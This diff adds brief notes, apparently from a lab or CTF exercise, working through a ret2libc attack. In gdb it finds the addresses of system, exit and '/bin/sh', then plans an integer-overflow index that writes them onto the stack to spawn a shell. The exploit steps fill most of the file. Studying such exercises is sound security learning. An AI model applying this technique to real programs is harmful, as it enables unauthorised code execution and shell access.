@@ -1,0 +1,26 @@
+
+
+
+
+
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+
+(gdb) find 0xf7e2c000,+0x1a0000,"/bin/sh"
+0xf7f897ec
+
+(gdb) p exit
+$1 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+
+at 114 segafault but 114%3=0
+
+at 1073741824 we can overflow to 0 so for 114 1073741824+114 1073741938
+4159090384
+4159040368
+4160264172
+
+we will put system adress at 1073741938
+and exit adress at 115
+and /bin/sh adress at 116
+
+this is how we perform a ret 2 libc attack.
